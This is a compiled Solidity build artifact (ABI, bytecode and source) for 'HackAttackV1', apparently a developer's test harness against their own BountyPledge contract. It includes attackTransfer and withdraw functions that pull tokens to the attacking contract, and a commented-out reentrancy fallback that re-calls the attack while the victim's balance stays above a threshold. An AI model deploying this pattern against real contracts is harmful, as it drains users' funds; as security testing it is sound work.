{
  "contractName": "HackAttackV1",
  "abi": [
    {
      "anonymous": false,
      "inputs": [
        {
          "indexed": true,
          "internalType": "address",
          "name": "sender",
          "type": "address"
        },
        {
          "indexed": true,
          "internalType": "uint256",
          "name": "value",
          "type": "uint256"
        },
        {
          "indexed": true,
          "internalType": "uint256",
          "name": "idx",
          "type": "uint256"
        }
      ],
      "name": "AddressEvent",
      "type": "event"
    },
    {
      "anonymous": false,
      "inputs": [
        {
          "indexed": true,
          "internalType": "bool",
          "name": "result",
          "type": "bool"
        },
        {
          "indexed": true,
          "internalType": "uint256",
          "name": "mark",
          "type": "uint256"
        }
      ],
      "name": "BoolEvent",
      "type": "event"
    },
    {
      "anonymous": false,
      "inputs": [
        {
          "indexed": true,
          "internalType": "bytes32",
          "name": "typeHash",
          "type": "bytes32"
        },
        {
          "indexed": true,
          "internalType": "uint256",
          "name": "idx",
          "type": "uint256"
        }
      ],
      "name": "Bytes32Event",
      "type": "event"
    },
    {
      "anonymous": false,
      "inputs": [
        {
          "indexed": false,
          "internalType": "bytes",
          "name": "data",
          "type": "bytes"
        },
        {
          "indexed": true,
          "internalType": "uint256",
          "name": "idx",
          "type": "uint256"
        }
      ],
      "name": "BytesEvent",
      "type": "event"
    },
    {
      "anonymous": false,
      "inputs": [
        {
          "indexed": false,
          "internalType": "uint8",
          "name": "version",
          "type": "uint8"
        }
      ],
      "name": "Initialized",
      "type": "event"
    },
    {
      "anonymous": false,
      "inputs": [
        {
          "indexed": true,
          "internalType": "address",
          "name": "previousOwner",
          "type": "address"
        },
        {
          "indexed": true,
          "internalType": "address",
          "name": "newOwner",
          "type": "address"
        }
      ],
      "name": "OwnershipTransferred",
      "type": "event"
    },
    {
      "anonymous": false,
      "inputs": [
        {
          "indexed": true,
          "internalType": "uint256",
          "name": "v",
          "type": "uint256"
        },
        {
          "indexed": true,
          "internalType": "uint256",
          "name": "idx",
          "type": "uint256"
        }
      ],
      "name": "Uint256Event",
      "type": "event"
    },
    {
      "stateMutability": "payable",
      "type": "fallback"
    },
    {
      "inputs": [],
      "name": "owner",
      "outputs": [
        {
          "internalType": "address",
          "name": "",
          "type": "address"
        }
      ],
      "stateMutability": "view",
      "type": "function"
    },
    {
      "inputs": [],
      "name": "renounceOwnership",
      "outputs": [],
      "stateMutability": "nonpayable",
      "type": "function"
    },
    {
      "inputs": [
        {
          "internalType": "address",
          "name": "newOwner",
          "type": "address"
        }
      ],
      "name": "transferOwnership",
      "outputs": [],
      "stateMutability": "nonpayable",
      "type": "function"
    },
    {
      "stateMutability": "payable",
      "type": "receive"
    },
    {
      "inputs": [
        {
          "internalType": "address",
          "name": "usdk_",
          "type": "address"
        },
        {
          "internalType": "address",
          "name": "bountyPldge_",
          "type": "address"
        }
      ],
      "name": "initialize",
      "outputs": [],
      "stateMutability": "payable",
      "type": "function"
    },
    {
      "inputs": [
        {
          "internalType": "uint256",
          "name": "amount",
          "type": "uint256"
        }
      ],
      "name": "transferSolarChain",
      "outputs": [],
      "stateMutability": "payable",
      "type": "function"
    },
    {
      "inputs": [
        {
          "internalType": "uint256",
          "name": "amount",
          "type": "uint256"
        }
      ],
      "name": "approve",
      "outputs": [],
      "stateMutability": "payable",
      "type": "function"
    },
    {
      "inputs": [
        {
          "internalType": "string",
          "name": "cid_",
          "type": "string"
        },
        {
          "internalType": "uint256",
          "name": "reward_",
          "type": "uint256"
        },
        {
          "internalType": "string",
          "name": "rewardUnit_",
          "type": "string"
        }
      ],
      "name": "pledge",
      "outputs": [],
      "stateMutability": "nonpayable",
      "type": "function"
    },
    {
      "inputs": [
        {
          "internalType": "string",
          "name": "bountyCid",
          "type": "string"
        },
        {
          "internalType": "uint256",
          "name": "amount",
          "type": "uint256"
        }
      ],
      "name": "attackTransfer",
      "outputs": [],
      "stateMutability": "nonpayable",
      "type": "function"
    },
    {
      "inputs": [
        {
          "internalType": "string",
          "name": "bountyCid",
          "type": "string"
        }
      ],
      "name": "attactWithdraw",
      "outputs": [],
      "stateMutability": "nonpayable",
      "type": "function"
    },
    {
      "inputs": [
        {
          "internalType": "address",
          "name": "receipt_",
          "type": "address"
        }
      ],
      "name": "withdraw",
      "outputs": [],
      "stateMutability": "nonpayable",
      "type": "function"
    }
  ],
  "bytecode": "0x608060405234801561001057600080fd5b5061111c806100206000396000f3fe60806040526004361061008f5760003560e01c80638da5cb5b116100565780638da5cb5b1461011357806395ecf3c61461013f578063ac35b8811461015f578063b759f9541461017f578063f2fde38b1461019257005b8063485cc9551461009857806351cff8d9146100ab57806353446f6d146100cb578063715018a6146100eb57806373fd24fc1461010057005b3661009657005b005b6100966100a6366004610cf4565b6101b2565b3480156100b757600080fd5b506100966100c6366004610d27565b6102d4565b3480156100d757600080fd5b506100966100e6366004610dec565b610311565b3480156100f757600080fd5b50610096610376565b61009661010e366004610e21565b61038a565b34801561011f57600080fd5b50603354604080516001600160a01b039092168252519081900360200190f35b34801561014b57600080fd5b5061009661015a366004610e3a565b6103b7565b34801561016b57600080fd5b5061009661017a366004610e7f565b61048b565b61009661018d366004610e21565b610571565b34801561019e57600080fd5b506100966101ad366004610d27565b6105ea565b600054610100900460ff16158080156101d25750600054600160ff909116105b806101ec5750303b1580156101ec575060005460ff166001145b6102545760405162461bcd60e51b815260206004820152602e60248201527f496e697469616c697a61626c653a20636f6e747261637420697320616c72656160448201526d191e481a5b9a5d1a585b1a5e995960921b60648201526084015b60405180910390fd5b6000805460ff191660011790558015610277576000805461ff0019166101001790555b6102818383610663565b6102896106b8565b80156102cf576000805461ff0019169055604051600181527f7f26b83ff96e1f2b6a682f133852f6798a09c465da95921460cefb38474024989060200160405180910390a15b505050565b6066546065546000916102f3916001600160a01b0390811691166106e7565b60655490915061030d906001600160a01b0316838361077b565b5050565b6066546040516318fdb3e160e11b81526001600160a01b03909116906331fb67c290610341908490600401610f48565b600060405180830381600087803b15801561035b57600080fd5b505af115801561036f573d6000803e3d6000fd5b5050505050565b61037e6107b0565b610388600061080a565b565b604051309082156108fc029083906000818181858888f1935050505015801561030d573d6000803e3d6000fd5b81516103ca906068906020850190610c3f565b5060698190556103de606780546001019055565b60006103e960675490565b6040516e61747461636b5472616e736665722d60881b6020820152602f810191909152604f0160408051601f19818403018152908290526066546324817ead60e01b83529092506001600160a01b0316906324817ead90610454908690309087908790600401610f5b565b600060405180830381600087803b15801561046e57600080fd5b505af1158015610482573d6000803e3d6000fd5b50505050505050565b610499606780546001019055565b60006040518060c001604052804281526020014261012c6104ba9190610f96565b8152600260208083019190915260408083018890526060808401889052608093840187905260665485519386015186840151928701519587015160a088015194516341d7cde160e11b81529798506001600160a01b03909216966383af9bc29661052e969592949390929091600401610fbc565b6020604051808303816000875af115801561054d573d6000803e3d6000fd5b505050506040513d601f19601f8201168201806040525081019061036f9190611009565b60655460665460405163095ea7b360e01b81526001600160a01b0391821660048201526024810184905291169063095ea7b3906044016020604051808303816000875af11580156105c6573d6000803e3d6000fd5b505050506040513d601f19601f8201168201806040525081019061030d9190611022565b6105f26107b0565b6001600160a01b0381166106575760405162461bcd60e51b815260206004820152602660248201527f4f776e61626c653a206e6577206f776e657220697320746865207a65726f206160448201526564647265737360d01b606482015260840161024b565b6106608161080a565b50565b600054610100900460ff1661068a5760405162461bcd60e51b815260040161024b90611044565b606580546001600160a01b039384166001600160a01b03199182161790915560668054929093169116179055565b600054610100900460ff166106df5760405162461bcd60e51b815260040161024b90611044565b61038861085c565b60006001600160a01b03831661070857506001600160a01b03811631610775565b6040516370a0823160e01b81526001600160a01b0383811660048301528416906370a0823190602401602060405180830381865afa15801561074e573d6000803e3d6000fd5b505050506040513d601f19601f820116820180604052508101906107729190611009565b90505b92915050565b6001600160a01b03831661079c576102cf6001600160a01b0383168261088c565b6102cf6001600160a01b03841683836109a5565b6033546001600160a01b031633146103885760405162461bcd60e51b815260206004820181905260248201527f4f776e61626c653a2063616c6c6572206973206e6f7420746865206f776e6572604482015260640161024b565b603380546001600160a01b038381166001600160a01b0319831681179093556040519116919082907f8be0079c531659141344cd1fd0a4f28419497f9722a3daafe3b4186f6b6457e090600090a35050565b600054610100900460ff166108835760405162461bcd60e51b815260040161024b90611044565b6103883361080a565b804710156108dc5760405162461bcd60e51b815260206004820152601d60248201527f416464726573733a20696e73756666696369656e742062616c616e6365000000604482015260640161024b565b6000826001600160a01b03168260405160006040518083038185875af1925050503d8060008114610929576040519150601f19603f3d011682016040523d82523d6000602084013e61092e565b606091505b50509050806102cf5760405162461bcd60e51b815260206004820152603a60248201527f416464726573733a20756e61626c6520746f2073656e642076616c75652c207260448201527f6563697069656e74206d61792068617665207265766572746564000000000000606482015260840161024b565b604080516001600160a01b03848116602483015260448083018590528351808403909101815260649092018352602080830180516001600160e01b031663a9059cbb60e01b17905283518085019094528084527f5361666545524332303a206c6f772d6c6576656c2063616c6c206661696c6564908401526102cf92869291600091610a35918516908490610ab2565b8051909150156102cf5780806020019051810190610a539190611022565b6102cf5760405162461bcd60e51b815260206004820152602a60248201527f5361666545524332303a204552433230206f7065726174696f6e20646964206e6044820152691bdd081cdd58d8d9595960b21b606482015260840161024b565b6060610ac18484600085610ac9565b949350505050565b606082471015610b2a5760405162461bcd60e51b815260206004820152602660248201527f416464726573733a20696e73756666696369656e742062616c616e636520666f6044820152651c8818d85b1b60d21b606482015260840161024b565b600080866001600160a01b03168587604051610b46919061108f565b60006040518083038185875af1925050503d8060008114610b83576040519150601f19603f3d011682016040523d82523d6000602084013e610b88565b606091505b5091509150610b9987838387610ba4565b979650505050505050565b60608315610c10578251610c09576001600160a01b0385163b610c095760405162461bcd60e51b815260206004820152601d60248201527f416464726573733a2063616c6c20746f206e6f6e2d636f6e7472616374000000604482015260640161024b565b5081610ac1565b610ac18383815115610c255781518083602001fd5b8060405162461bcd60e51b815260040161024b9190610f48565b828054610c4b906110ab565b90600052602060002090601f016020900481019282610c6d5760008555610cb3565b82601f10610c8657805160ff1916838001178555610cb3565b82800160010185558215610cb3579182015b82811115610cb3578251825591602001919060010190610c98565b50610cbf929150610cc3565b5090565b5b80821115610cbf5760008155600101610cc4565b80356001600160a01b0381168114610cef57600080fd5b919050565b60008060408385031215610d0757600080fd5b610d1083610cd8565b9150610d1e60208401610cd8565b90509250929050565b600060208284031215610d3957600080fd5b610d4282610cd8565b9392505050565b634e487b7160e01b600052604160045260246000fd5b600082601f830112610d7057600080fd5b813567ffffffffffffffff80821115610d8b57610d8b610d49565b604051601f8301601f19908116603f01168101908282118183101715610db357610db3610d49565b81604052838152866020858801011115610dcc57600080fd5b836020870160208301376000602085830101528094505050505092915050565b600060208284031215610dfe57600080fd5b813567ffffffffffffffff811115610e1557600080fd5b610ac184828501610d5f565b600060208284031215610e3357600080fd5b5035919050565b60008060408385031215610e4d57600080fd5b823567ffffffffffffffff811115610e6457600080fd5b610e7085828601610d5f565b95602094909401359450505050565b600080600060608486031215610e9457600080fd5b833567ffffffffffffffff80821115610eac57600080fd5b610eb887838801610d5f565b9450602086013593506040860135915080821115610ed557600080fd5b50610ee286828701610d5f565b9150509250925092565b60005b83811015610f07578181015183820152602001610eef565b83811115610f16576000848401525b50505050565b60008151808452610f34816020860160208601610eec565b601f01601f19169290920160200192915050565b602081526000610d426020830184610f1c565b608081526000610f6e6080830187610f1c565b6001600160a01b0386166020840152604083018590528281036060840152610b998185610f1c565b60008219821115610fb757634e487b7160e01b600052601160045260246000fd5b500190565b86815285602082015260ff8516604082015260c060608201526000610fe460c0830186610f1c565b84608084015282810360a0840152610ffc8185610f1c565b9998505050505050505050565b60006020828403121561101b57600080fd5b5051919050565b60006020828403121561103457600080fd5b81518015158114610d4257600080fd5b6020808252602b908201527f496e697469616c697a61626c653a20636f6e7472616374206973206e6f74206960408201526a6e697469616c697a696e6760a81b606082015260800190565b600082516110a1818460208701610eec565b9190910192915050565b600181811c908216806110bf57607f821691505b602082108114156110e057634e487b7160e01b600052602260045260246000fd5b5091905056fea2646970667358221220b19bd156f9903d5d6d3a4d173de4493595ee5c1e5bfa042abb01746554610e5f64736f6c634300080a0033",
  "immutableReferences": {},
  "source": "// SPDX-License-Identifier: MIT\npragma solidity >=0.4.22 <0.9.0;\n\nimport \"@openzeppelin/contracts-upgradeable/access/OwnableUpgradeable.sol\";\nimport \"@openzeppelin/contracts-upgradeable/proxy/utils/Initializable.sol\";\nimport \"@openzeppelin/contracts-upgradeable/utils/AddressUpgradeable.sol\";\nimport \"@openzeppelin/contracts-upgradeable/token/ERC20/ERC20Upgradeable.sol\";\nimport \"@openzeppelin/contracts-upgradeable/token/ERC20/utils/SafeERC20Upgradeable.sol\";\nimport \"@openzeppelin/contracts-upgradeable/utils/math/SafeMathUpgradeable.sol\";\nimport \"@openzeppelin/contracts-upgradeable/utils/CountersUpgradeable.sol\";\nimport \"./libraries/Transfers.sol\";\nimport \"./IBountyPledge.sol\";\n\n/**\n * \n */\ncontract HackAttackV1 is Initializable, OwnableUpgradeable {\n    using Transfers for address;\n    using CountersUpgradeable for CountersUpgradeable.Counter;\n    struct PledgeRequest {\n        uint256 startTime;\n        uint256 endTime;\n        uint8 bountyType; //1=single/2=multiple\n        string cid;\n        uint256 reward;\n        string rewardUnit; //: USDT,MATIC\n    }\n\n    address private _usdk;\n    address private _bountyPledge;\n    CountersUpgradeable.Counter _globalIndexer;\n    string private _bountyCid;\n    uint256 private _amount;\n\n    event AddressEvent(\n        address indexed sender,\n        uint256 indexed value,\n        uint256 indexed idx\n    );\n    event BoolEvent(bool indexed result, uint256 indexed mark);\n    event Bytes32Event(bytes32 indexed typeHash, uint256 indexed idx);\n    event Uint256Event(uint256 indexed v, uint256 indexed idx);\n    event BytesEvent(bytes data, uint256 indexed idx);\n\n    function initialize(address usdk_, address bountyPldge_)\n        external\n        payable\n        initializer\n    {\n        __BountyPledge_init_unchained(usdk_, bountyPldge_);\n        __Ownable_init();\n    }\n\n    function __BountyPledge_init_unchained(address usdk_, address bountyPldge_)\n        internal\n        onlyInitializing\n    {\n        _usdk = usdk_;\n        _bountyPledge = bountyPldge_;\n    }\n\n    function transferSolarChain(uint256 amount) public payable {\n        payable(address(this)).transfer(amount);\n    }\n\n    function approve(uint256 amount) public payable {\n        ERC20Upgradeable(_usdk).approve(_bountyPledge, amount);\n/**\n        (bool success, bytes memory returndata) = _usdk.call( abi.encodeWithSignature(\n                \"approve(address spender,uint256 amount)\",\n                _bountyPledge,\n                amount\n        ));\n\n        require(success,\"Attack:Fail to Approve.\");\n\n      // (bool success, bytes memory returndata) = _usdk.call( abi.encodeWithSelector(ERC20Upgradeable.transfer.selector, _bountyPledge, amount));\n\n        emit BoolEvent(success, 2);\n        emit BytesEvent(returndata, 2);\n**/\n    }\n\n    //\n    function pledge(\n        string memory cid_,\n        uint256 reward_,\n        string memory rewardUnit_\n    ) public {\n        _globalIndexer.increment();\n\n        PledgeRequest memory req = PledgeRequest({\n            startTime: block.timestamp,\n            endTime: block.timestamp + 5 * 60,\n            bountyType: 2, //1=single/2=multiple\n            cid: cid_,\n            reward: reward_,\n            rewardUnit: rewardUnit_ //: USDT,MATIC\n        });\n/** \n    _bountyPledge.functionDelegateCall(\n                abi.encodeWithSelector(\n                    IAdapter.call.selector,\n                    assetIn,\n                    amountIn,\n                    extraNativeValue,\n                    bridgeData.callData\n                )\n            );\n*/\n/**\n        (bool success, bytes memory returndata) = _bountyPledge.call(\n            abi.encodeWithSignature(\n                \"pledge2(uint256,uint256,uint8,string,uint256,string)\",\n                req.startTime,\n                req.endTime,\n                req.bountyType,\n                req.cid,\n                req.reward,\n                req.rewardUnit\n            )\n        );\n\n        emit BoolEvent(success, 2);\n        emit BytesEvent(returndata, 2);\n\n*/\n\n        IBountyPledge(_bountyPledge).pledge2(req.startTime,\n                req.endTime,\n                req.bountyType,\n                req.cid,\n                req.reward,\n                req.rewardUnit);\n    }\n\n    //\n    /**\n    transfer(\n        string memory bountyCid,\n        address to,\n        uint256 amount,\n        string memory contributeCid\n    )\n     */\n    function attackTransfer(string memory bountyCid, uint256 amount) public {\n        _bountyCid = bountyCid;\n        _amount = amount;\n        _globalIndexer.increment();\n        string memory contributeCid = string(\n            abi.encodePacked(\"attackTransfer-\", _globalIndexer.current())\n        );\n/**\n        (bool success, bytes memory returndata) = _bountyPledge.call(\n            abi.encodeWithSignature(\n                \"transfer(string,address,uint256,string)\",\n                bountyCid,\n                address(this),\n                amount,\n                contributeCid\n            )\n        );\n        emit BoolEvent(success, 2);\n        emit BytesEvent(returndata, 2);\n*/\n        IBountyPledge(_bountyPledge).transfer( bountyCid,\n                address(this),\n                amount,\n                contributeCid);\n\n    }\n\n    //\n    function attactWithdraw(string memory bountyCid) public {\n         IBountyPledge(_bountyPledge).withdraw(bountyCid);\n    }\n\n    function withdraw(address receipt_) external {\n        uint256 amount = _usdk.getBalanceWithOwner(_bountyPledge);\n        _usdk.transferOut(receipt_, amount);\n    }\n\n    fallback() external payable {\n        //emit AddressEvent(msg.sender, msg.value, 2);\n    }\n\n    receive() external payable {\n        //emit AddressEvent(msg.sender, msg.value, 1);\n    }\n\n    /*\n    fallback() external payable {\n        uint256 balance = _usdk.getBalanceWithOwner(_bountyPledge);\n        if (balance < 1000000){\n            return ;\n        }\n        attackTransfer(_bountyCid,_amount);\n            \n        emit AddressEvent(msg.sender, msg.value, 2);\n    }\n\n    receive() external payable {\n        emit AddressEvent(msg.sender, msg.value, 1);\n    }\n    */\n}\n",
  "sourcePath": "/Users/xcdong/resource/project/Ethereum/dxch/chain-contracts/kugga-usdk/contracts/HackAttackV1.sol",
  "compiler": {
    "name": "solc",
    "version": "0.8.10+commit.fc410830.Emscripten.clang"
  },
  "schemaVersion": "3.4.7",
  "updatedAt": "2023-04-05T03:18:20.242Z",
  "devdoc": {
    "kind": "dev",
    "methods": {
      "owner()": {
        "details": "Returns the address of the current owner."
      },
      "renounceOwnership()": {
        "details": "Leaves the contract without owner. It will not be possible to call `onlyOwner` functions anymore. Can only be called by the current owner. NOTE: Renouncing ownership will leave the contract without an owner, thereby removing any functionality that is only available to the owner."
      },
      "transferOwnership(address)": {
        "details": "Transfers ownership of the contract to a new account (`newOwner`). Can only be called by the current owner."
      }
    },
    "version": 1
  },
  "userdoc": {
    "kind": "user",
    "methods": {
      "attackTransfer(string,uint256)": {
        "notice": "transfer( string memory bountyCid, address to, uint256 amount, string memory contributeCid )"
      }
    },
    "notice": "",
    "version": 1
  }
}